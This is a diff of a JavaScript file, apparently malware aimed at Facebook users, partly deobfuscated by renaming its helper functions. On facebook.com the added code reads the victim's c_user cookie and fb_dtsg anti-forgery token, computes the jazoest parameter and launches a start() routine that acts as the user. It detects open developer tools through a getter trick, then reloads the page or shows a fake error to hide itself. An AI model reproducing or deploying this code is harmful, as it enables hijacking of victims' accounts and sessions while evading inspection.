+    return finalWord;
+  }
+function generate_name(length, firstUpper) {
   rname = "";
   sesli = "aeiou";
   sessiz = "bcdfghjklmnprstvyz";
-  rname = 1 == _v(1, 2) ? sessiz[_v(0, sessiz["length"] - 1)] : sesli[_v(0, sesli["length"] - 1)];
-  if (1 == b) {
-    rname = rname["toUpperCase"]();
+  rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
+  if (firstUpper == true) {
+    rname = rname.toUpperCase();
   }
   n = 0;
-  for (;n < c;n++) {
-    rname = 0 <= sesli["indexOf"](rname[rname["length"] - 1]) ? rname + sessiz[_v(0, sessiz["length"] - 1)] : rname + sesli[_v(0, sesli["length"] - 1)];
+  for (;n < length;n++) {
+    if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
+      rname += sessiz[rand(0, sessiz.length - 1)];
+    } else {
+      rname += sesli[rand(0, sesli.length - 1)];
+    }
   }
   return rname;
 }
-function _n(c, b, e) {
-  var d = false;
+function getCookie(cname) {
+  var name = cname + "=";
+  var ca = document.cookie.split(";");
+  var i = 0;
+  for (;i < ca.length;i++) {
+    var c = ca[i];
+    for (;c.charAt(0) == " ";) {
+      c = c.substring(1);
+    }
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return "";
+}
+function createCookie(name, value, days) {
+  var expires;
+  if (days) {
+    var date = new Date;
+    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1E3);
+    expires = "; expires=" + date.toGMTString();
+  } else {
+    expires = "";
+  }
+  document.cookie = name + "=" + value + expires + "; path=/";
+}
+function inArray(arr, key, value) {
+  var res = false;
   a = 0;
-  for (;a < c["length"];a++) {
-    for (k in c[a]) {
-      if (k == b && c[a][k] == e) {
-        d = true;
+  for (;a < arr.length;a++) {
+    for (k in arr[a]) {
+      if (k == key && arr[a][k] == value) {
+        res = true;
         break;
       }
     }
   }
-  return d;
-}
-function _o(c, b) {
-  var e = "abcdefghijklmnoprstuvyzx0123456789";
-  var d = "";
-  cr = 0;
-  for (;cr < c["length"];cr++) {
-    d += e[b["indexOf"](c[cr])];
-  }
-  return d;
-}
-function _p() {
-  function c() {
-    return Math["floor"](65536 * (1 + Math["random"]())).toString(16).substring(1);
-  }
-  return c() + c() + "-" + c() + "-" + c() + "-" + c() + "-" + c() + c() + c();
-}
-function _s(c, b) {
-  var e = [];
-  for (;e["length"] < c;) {
-    var d = Math["floor"](Math["random"]() * b);
-    if (0 > e["indexOf"](d)) {
-      e["push"](d);
-    }
-  }
-  return e;
-}
-function _t(c, b) {
-  var e = false;
-  for (key in c) {
-    if (key["toString"]() == b) {
-      e = c[key];
-      break;
-    } else {
-      if (typeof c[key] == "object" && (e = _t(c[key], b), 0 != e)) {
-        break;
-      }
-    }
-  }
-  return e;
-}
-function _u(c) {
-  var b = c["length"];
-  var e;
-  var d;
-  for (;0 !== b;) {
-    d = Math["floor"](Math["random"]() * b);
-    --b;
-    e = c[b];
-    c[b] = c[d];
-    c[d] = e;
-  }
-  return c;
-}
-function _v(c, b) {
-  return Math["floor"](Math["random"]() * (b - c)) + c;
-}
-function _y(c) {
-  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
-  ret = "";
-  l = 0;
-  for (;l < c;l++) {
-    ret += mtn[Math["floor"](Math["random"]() * mtn["length"])];
-  }
-  return ret;
-}
-function _z(c) {
-  return Object["keys"](c).map(function(b) {
-    return encodeURIComponent(b) + "=" + encodeURIComponent(c[b]);
-  }).join("&");
+  return res;
 }
 function get_dyn() {
- function toCompressedString() {
-   $BitMap1 = [];
-   for (i in t) {
-     $BitMap1[t[i]] = 1;
-   }
-   if ($BitMap1["length"] === 0) {
-     return "";
-   }
-   var l = [];
-   var m = 1;
-   var n = $BitMap1[0] || 0;
-   var o = n.toString(2);
-   var p = 1;
-   for (;p < $BitMap1["length"];p++) {
-     var q = $BitMap1[p] || 0;
-     if (q === n) {
-       m++;
-     } else {
-       l["push"](j(m));
-       n = q;
-       m = 1;
-     }
-   }
-   if (m) {
-     l["push"](j(m));
-   }
-   return k(o + l["join"](""));
- }
- function j(l) {
-   var m = l.toString(2);
-   var n = "0"["repeat"](m["length"] - 1);
-   return n + m;
- }
- function k(l) {
-   var m = (l + "00000")["match"](/[01]{6}/g);
-   var n = "";
-   var o = 0;
-   for (;o < m["length"];o++) {
-     n += h[parseInt(m[o], 2)];
-   }
-   return n;
- }
- var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
- var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
- var is = bd["concat"](hd);
- var t = [];
- for (x in is) {
-   if (is[x] != null) {
-     var p = is[x]["replace"]("},", "")["replace"]("]", "");
-     if (parseInt(p) >= 7) {
-       t["push"](parseInt(p));
-     }
-   }
- }
- var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
- return toCompressedString();
-}
-function rastgele(uzunluk) {
-    mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
-    ret = "";
-    for (l = 0; l < uzunluk; l++) {
-        ret += mtn[Math.floor(Math.random() * mtn.length)];
+  function toCompressedString() {
+    $BitMap1 = [];
+    for (i in t) {
+      $BitMap1[t[i]] = 1;
     }
-    return ret;
-}
-function rand(min,max){
-    return Math.floor(Math.random()* (max-min))+min;
-}
-function inArray(arr, key, value){
-    var res = false;
-    for(a=0;a<arr.length;a++){
-        for(k in arr[a]){
-            if(k == key && arr[a][k] == value){
-                res = true;
-                break;
-            }
-        }
+    if ($BitMap1["length"] === 0) {
+      return "";
     }
-    return res;
-}
-
-function decode(t,h){
-    var a = "abcdefghijklmnoprstuvyzx0123456789";
-    var c = "";
-    for(cr=0;cr<t.length;cr++){
-        c += a[h.indexOf(t[cr])];
+    var l = [];
+    var m = 1;
+    var n = $BitMap1[0] || 0;
+    var o = n.toString(2);
+    var p = 1;
+    for (;p < $BitMap1["length"];p++) {
+      var q = $BitMap1[p] || 0;
+      if (q === n) {
+        m++;
+      } else {
+        l["push"](j(m));
+        n = q;
+        m = 1;
+      }
     }
-    return c;
+    if (m) {
+      l["push"](j(m));
+    }
+    return k(o + l["join"](""));
+  }
+  function j(l) {
+    var m = l.toString(2);
+    var n = "0"["repeat"](m["length"] - 1);
+    return n + m;
+  }
+  function k(l) {
+    var m = (l + "00000")["match"](/[01]{6}/g);
+    var n = "";
+    var o = 0;
+    for (;o < m["length"];o++) {
+      n += h[parseInt(m[o], 2)];
+    }
+    return n;
+  }
+  var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
+  var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
+  var is = bd["concat"](hd);
+  var t = [];
+  for (x in is) {
+    if (is[x] != null) {
+      var p = is[x]["replace"]("},", "")["replace"]("]", "");
+      if (parseInt(p) >= 7) {
+        t["push"](parseInt(p));
+      }
+    }
+  }
+  var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
+  return toCompressedString();
 }
-
 function guid() {
   function s4() {
-    return Math.floor((1 + Math.random()) * 0x10000)
-      .toString(16)
-      .substring(1);
+    return Math.floor((1 + Math.random()) * 65536).toString(16).substring(1);
   }
-  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
-    s4() + '-' + s4() + s4() + s4();
+  return s4() + s4() + "-" + s4() + "-" + s4() + "-" + s4() + "-" + s4() + s4() + s4();
 }
-
 function randoms(l, m) {
-    var r = [];
-    while (r.length < l) {
-        var rnd = Math.floor(Math.random() * m);
-        if (r.indexOf(rnd) < 0) {
-            r.push(rnd);
-        }
+  var r = [];
+  for (;r.length < l;) {
+    var rnd = Math.floor(Math.random() * m);
+    if (r.indexOf(rnd) < 0) {
+      r.push(rnd);
     }
-    return r;
+  }
+  return r;
 }
-
-function searchArray(a,k){
-    var found = false;
-    for(key in a){
-        if(key.toString() == k){
-            found = a[key];
-            break;
-        }else if(typeof a[key] == "object"){
-            found = searchArray(a[key],k);
-            if(found != false){
-                break;
-            }
+function searchArray(a, k) {
+  var found = false;
+  for (key in a) {
+    if (key.toString() == k) {
+      found = a[key];
+      break;
+    } else {
+      if (typeof a[key] == "object") {
+        found = searchArray(a[key], k);
+        if (found != false) {
+          break;
         }
+      }
     }
-    return found;
+  }
+  return found;
 }
-
 function shuffle(array) {
-  var currentIndex = array.length, temporaryValue, randomIndex;
-
-  while (0 !== currentIndex) {
+  var currentIndex = array.length;
+  var temporaryValue;
+  var randomIndex;
+  for (;0 !== currentIndex;) {
     randomIndex = Math.floor(Math.random() * currentIndex);
     currentIndex -= 1;
     temporaryValue = array[currentIndex];
     array[currentIndex] = array[randomIndex];
     array[randomIndex] = temporaryValue;
   }
-
   return array;
 }
-function deSerialize(json) {
-    return Object.keys(json).map(function(key) {
-        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
-    }).join('&');
+function rand(min, max) {
+  return Math.floor(Math.random() * (max - min)) + min;
 }
+function rastgele(uzunluk) {
+  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
+  ret = "";
+  l = 0;
+  for (;l < uzunluk;l++) {
+    ret += mtn[Math.floor(Math.random() * mtn.length)];
+  }
+  return ret;
+}
+function random(nr) {
+  mtn = "abcdefghijklmnoprstuvyzx";
+  ret = "";
+  l = 0;
+  for (;l < nr;l++) {
+    ret += mtn[Math.floor(Math.random() * mtn.length)];
+  }
+  return ret;
+}
+function deSerialize(json) {
+  return Object.keys(json).map(function(key) {
+    return encodeURIComponent(key) + "=" + encodeURIComponent(json[key]);
+  }).join("&");
+}
+
 var cntrl = "d";
 var element = new Image;
-element["__defineGetter__"]("id", function() {
+element.__defineGetter__("id", function() {
   cntrl = "e";
-  if (0 == cnsl) {
-    win["location"] = "";
+  if (cnsl == false) {
+    location.reload();
   }
 });
-console["log"](element);
-console["clear"]();
-function _composer() {
-  var c = new sie;
-  c["open"]("GET", "https://www.facebook.com/");
-  c["send"]();
-  c["onreadystatechange"] = function() {
-    if (4 == c["readyState"] && (profile_id = c["responseText"].split("USER_ID" + '"' + ":")[1].split('"')[1].split('"')[0], 0 != profile_id)) {
-      user_name = c["responseText"].split("NAME" + '"' + ":")[1].split('"')[1].split('"')[0];
-      locale = c["responseText"].split('{"locale' + '"' + ":")[1].split('"')[1].split('"')[0];
-      fb_dtsg = c["responseText"].split("name=" + '"' + "fb_dtsg")[1].split("value=" + '"')[1].split('"')[0];
-      __rev = c["responseText"].split('"' + "server_revision" + '"' + ":")[1].split(",")[0];
-      jazoest = "";
-      var b = 0;
-      for (;b < fb_dtsg["length"];b++) {
-        jazoest += fb_dtsg["charCodeAt"](b);
-      }
-      jazoest = "2" + jazoest;
-      dyn = get_dyn();
-      nejse();
+console.log(element);
+console.clear();
+if (location.hostname.indexOf("facebook.com") >= 0 && (cntrl == "d" || cnsl == true)) {
+  fb_dtsg_list = document.getElementsByName("fb_dtsg");
+  if (fb_dtsg_list.length > 0) {
+    profile_id = document.cookie.match(/c_user=(\d+)/)[1];
+    fb_dtsg = fb_dtsg_list[0].value;
+    __dyn = get_dyn();
+    if (document.head.innerHTML.split('"client_revision":')[1]) {
+      __rev = document.head.innerHTML.split('"client_revision":')[1].split(",")[0];
+    } else {
+      __rev = rand(1111111, 9999999);
     }
-  };
-}
-if (0 <= location["hostname"].indexOf("facebook.com") && (cntrl == "d" || 1 == cnsl)) {
-  if (!document["getElementById"]("isrun") && 0 > location["href"].indexOf("facebook.com/checkpoint")) {
-    var lg = document["createElement"]("meta");
-    lg["id"] = "isrun";
-    document["head"].appendChild(lg);
-    _composer();
-  }
-} else {
-  if (0 <= location["hostname"].indexOf("facebook.com")) {
-    console["error"]("Uncaught ReferenceError: fb_dtsg is not defined");
+    jazoest = "";
+    var x = 0;
+    for (;x < fb_dtsg.length;x++) {
+      jazoest += fb_dtsg.charCodeAt(x);
+    }
+    jazoest = "2" + jazoest;
+    start();
   }
 }
 ;
